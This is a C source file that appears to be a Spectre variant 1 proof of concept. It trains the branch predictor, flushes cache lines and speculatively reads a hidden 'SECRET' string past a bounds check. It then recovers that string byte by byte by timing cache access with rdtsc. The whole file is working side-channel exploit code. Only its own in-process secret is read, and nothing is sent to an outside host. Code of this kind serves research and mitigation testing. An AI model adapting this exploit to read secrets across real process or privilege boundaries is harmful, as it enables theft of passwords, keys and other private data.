#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <x86intrin.h>


#define CACHE_PAGE 128
#define COUNT 100
#define SECRET_SZ 16



volatile char secret[SECRET_SZ + 16] =
"\0\0\0\0" "\0\0\0\0"
"\0\0\0\0" "\0\0\0\0"
//"0\0\0\0" "\0\0\0\0"
"SECRET";
volatile uint8_t detector[256 * CACHE_PAGE];
volatile uint32_t detector_sz = 256 * CACHE_PAGE;

volatile uint32_t secret_sz = SECRET_SZ;


void sink(uint32_t x) {
  (void)x;
}

void delay() {
  uint32_t x = 0x1234;
  for(int i = 0; i < 1000; i++) {
    x *= i;
    x ^= 123;
    x *= 173;
  }
}

int x;
void guarded_secret(int idx) {
  if (idx < secret_sz) {
    x = x ^ detector[secret[idx] * CACHE_PAGE];
  }
}

#define TRAIN 50
#define FREQ 10
uint32_t check(int idx, int val_to_check ) {
  for(int i = 0; i < 256; i++) {
    _mm_clflush((void*)(detector + i * CACHE_PAGE));
  }
  //delay(); // _mm_mfence

  int trx = idx % secret_sz;
  for(int i = 0; i < TRAIN; i++) {
    _mm_clflush((void*)&secret_sz);
    delay();

    /*if (i % FREQ == 0) {
      guarded_secret(idx);
    } else {
      guarded_secret(trx);
    }*/

    int addr = ((i % FREQ) - 1) & ~0xffff;
    addr = (addr | (addr >> 16));  // 00000 ... fffff
    addr = trx ^ (addr & (trx ^ idx));

    //printf("%i, %i\n", i, addr);

    guarded_secret(addr);
  }
  //exit(1);

  //_mm_lfence();
  delay();

  uint64_t a, b;
  val_to_check *= CACHE_PAGE;

  a = __rdtsc();
  sink(detector[val_to_check]);
  _mm_lfence();
  b = __rdtsc();

  return (uint32_t)(b - a);
}

uint32_t check2(int idx, int val_to_check) {
  uint32_t in_ram = 0;
  uint32_t in_cache = 0;

  for(int i = 0; i < COUNT; i++) {
    uint32_t tm = check(idx, val_to_check);
    if (tm > 80) {
      in_ram++;
    } else {
      in_cache++;
    }
  }

  //printf("%i %i -- ", in_cache, in_ram);
  if (in_cache > in_ram) {
    return 1;
  }

  return 0;
}

uint8_t get_byte(int idx) {

  uint8_t ch = 0;

  for(int i = 'A'; i <= 'Z'; i++) {
    if (check2(idx, i) == 1) {
      ch = i;
    }
    //printf("%c: %u\n", i, check2(idx, i));
  }

  return ch;
}


int main(void) {
  for (int i = 0; i < 6; i++) {
    putchar(get_byte(SECRET_SZ + i));
  }

  puts("");


  return 0;
}
